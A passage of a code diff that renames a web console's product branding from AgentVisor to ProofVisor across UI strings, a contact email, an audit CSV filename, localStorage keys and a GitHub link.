             '<span style="margin-left:8px; color:var(--fg-3); font-size:var(--t-sec)">0 endpoints</span>' +
           "</div>" +
           '<div style="padding: 24px 16px">' +
-          emptyState("No webhooks yet", "Wire AgentVisor to Slack / PagerDuty / Datadog / your own service. Payloads are HMAC-SHA256 signed.", "+ Add webhook", null, "whAdd") +
+          emptyState("No webhooks yet", "Wire ProofVisor to Slack / PagerDuty / Datadog / your own service. Payloads are HMAC-SHA256 signed.", "+ Add webhook", null, "whAdd") +
           "</div></div>";
       on($("#whAdd", root), "click", openAddModal);
       return;
@@ -6026,7 +6026,7 @@
       '<div class="card">' +
         "<h2>Plan</h2>" +
         '<div style="display:flex; align-items:baseline; gap:8px; margin-bottom: 12px"><span style="font-size:22px; font-weight:600">Free</span> <span class="pill accent">current plan</span></div>' +
-        '<p style="color: var(--fg-2); font-size: var(--t-sec); margin: 0">All governance features included while AgentVisor is in preview. Pricing below is what launches with the beta.</p>' +
+        '<p style="color: var(--fg-2); font-size: var(--t-sec); margin: 0">All governance features included while ProofVisor is in preview. Pricing below is what launches with the beta.</p>' +
       "</div>" +
       '<div class="pricing-grid">' +
         tier("Free", "$0", "up to 10 deployments",
@@ -6051,9 +6051,9 @@
           "</div>"
         : "");
     var b = $("#upgradeBtn", root);
-    if (b) b.addEventListener("click", function () { comingSoon("Upgrade to Team", "Billing lands in the beta. In the meantime, ping the AgentVisor team to enable Team features on your workspace."); });
+    if (b) b.addEventListener("click", function () { comingSoon("Upgrade to Team", "Billing lands in the beta. In the meantime, ping the ProofVisor team to enable Team features on your workspace."); });
     var c = $("#contactBtn", root);
-    if (c) c.addEventListener("click", function () { comingSoon("Enterprise", "Talk to us about a self-hosted control plane, custom trust anchors, and SLAs: hello@agentvisorai.me"); });
+    if (c) c.addEventListener("click", function () { comingSoon("Enterprise", "Talk to us about a self-hosted control plane, custom trust anchors, and SLAs: hello@proofvisor.com"); });
   }
   async function renderSettingsAudit(root) {
     // R124 F2: if the user was bounced here from a failed
@@ -6218,7 +6218,7 @@
       var blob = new Blob(["\ufeff" + lines.join("\r\n")], { type: "text/csv;charset=utf-8" });
       var a2 = document.createElement("a");
       a2.href = URL.createObjectURL(blob);
-      a2.download = "agentvisor-audit-" + stamp + ".csv";
+      a2.download = "proofvisor-audit-" + stamp + ".csv";
       document.body.appendChild(a2); a2.click(); a2.remove();
       setTimeout(function () { URL.revokeObjectURL(a2.href); }, 4000);
       toast(list.length + " audit entr" + (list.length === 1 ? "y" : "ies") + " exported");
@@ -6333,7 +6333,7 @@
     });
     var actions = [
       { g: "Actions", label: "Toggle theme", desc: "Switch light / dark", run: function () { toggleTheme(); } },
-      { g: "Actions", label: "New deployment", desc: "Register an agentvisord daemon", run: function () { navigate("#/deployments"); setTimeout(openCreateDeploymentModal, 100); } },
+      { g: "Actions", label: "New deployment", desc: "Register an proofvisord daemon", run: function () { navigate("#/deployments"); setTimeout(openCreateDeploymentModal, 100); } },
       { g: "Actions", label: "Change password", desc: "Rotate your password; other sessions sign out", run: function () { navigate("#/settings/general"); setTimeout(changePasswordModal, 250); } },
       { g: "Actions", label: "Sign out", desc: "Leave this workspace", run: signOut },
     ];
@@ -6354,13 +6354,13 @@
       // Hidden in fresh mode with the tour: fresh listSessions ignores
       // the bigdata flag entirely, so the entry would be a lying no-op.
       var big = false;
-      try { big = localStorage.getItem("av_mock_bigdata") === "1"; } catch (e) {}
+      try { big = localStorage.getItem("pv_mock_bigdata") === "1"; } catch (e) {}
       actions.push({
         g: "Actions",
         label: big ? "Back to the 24h dataset" : "Load the 30-day dataset (280 sessions)",
         desc: big ? "Return to the focused demo data" : "What the console looks like at scale — pagination, sort, exports",
         run: function () {
-          try { localStorage.setItem("av_mock_bigdata", big ? "0" : "1"); } catch (e) {}
+          try { localStorage.setItem("pv_mock_bigdata", big ? "0" : "1"); } catch (e) {}
           // navigate() renders (hashchange, or directly when the hash
           // is unchanged) — an extra render() here raced it with two
           // parallel renderSessionsList fetches clobbering each other.
@@ -6389,14 +6389,14 @@
     var pages = [
       { g: "Pages", label: "Verify a receipt", desc: "Public offline verifier — green tick, no account", run: function () { window.open("../verify/", "_blank", "noopener"); } },
       { g: "Pages", label: "Watch the pitch", desc: "30 s hero + 130 s full tour, with transcripts", run: function () { window.open("../pitch/", "_blank", "noopener"); } },
-      { g: "Pages", label: "Read the code", desc: "github.com/AgentVisorAI/agentvisor", run: function () { window.open("https://github.com/AgentVisorAI/agentvisor", "_blank", "noopener"); } },
+      { g: "Pages", label: "Read the code", desc: "github.com/ProofVisorAI/proofvisor", run: function () { window.open("https://github.com/ProofVisorAI/proofvisor", "_blank", "noopener"); } },
     ];
     if (state.ds.mode === "mock") {
       // Demo-table reset: judges hand the laptop around; this returns
       // the console to the pristine Northwind showcase in one action.
       pages.push({ g: "Pages", label: "Reset demo data", desc: "Back to the pristine showcase workspace", run: function () {
         try {
-          ["av_mock_fresh_t0", "av_mock_fresh_identity", "av_mock_signed_out", "av_tour_dismissed", "av_mock_bigdata"].forEach(function (k) { localStorage.removeItem(k); });
+          ["pv_mock_fresh_t0", "pv_mock_fresh_identity", "pv_mock_signed_out", "pv_tour_dismissed", "pv_mock_bigdata"].forEach(function (k) { localStorage.removeItem(k); });
         } catch (e) {}
         location.hash = "#/overview";
         location.reload();
